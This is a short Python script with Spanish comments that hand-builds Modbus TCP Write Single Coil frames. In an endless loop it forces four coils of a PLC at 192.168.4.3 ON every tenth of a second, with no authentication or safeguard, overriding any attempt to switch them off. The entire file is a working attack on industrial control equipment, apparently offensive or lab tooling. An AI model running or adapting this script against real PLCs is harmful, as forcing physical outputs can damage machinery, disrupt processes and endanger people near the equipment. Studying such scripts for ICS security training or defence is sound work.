import socket
import time

# Configuración del PLC
PLC_IP = "192.168.4.3"  #
PLC_PORT = 502  

# Direcciones de las bobinas que quieres activar
COIL_ADDRESSES = [2, 3, 4, 5] 

# Función para crear un mensaje Modbus TCP para escribir en una bobina
def build_modbus_request(transaction_id, coil_address, value):
    return (
        transaction_id.to_bytes(2, 'big') +  # Transaction ID
        b'\x00\x00' +  # Protocol ID (Siempre 0 para Modbus TCP)
        b'\x00\x06' +  # Longitud (6 bytes después de este campo)
        b'\x01' +  # Unit ID (por defecto 1)
        b'\x05' +  # Function Code 5 (Write Single Coil)
        coil_address.to_bytes(2, 'big') +  # Dirección de la bobina
        (b'\xFF\x00' if value else b'\x00\x00')  # Valor (Encender o Apagar)
    )

# Crear socket
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    try:
        s.connect((PLC_IP, PLC_PORT))
        print("[+] Conectado al PLC, forzando varias salidas...")
        transaction_id = 1
        while True:
            for coil in COIL_ADDRESSES:
                request = build_modbus_request(transaction_id, coil, True)
                s.sendall(request)
                response = s.recv(1024)  # Recibir respuesta (aunque no se usa)
                transaction_id = (transaction_id + 1) % 65536  # Evitar desbordamiento
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("[-] Deteniendo el script...")
    except Exception as e:
        print(f"[!] Error: {e}")
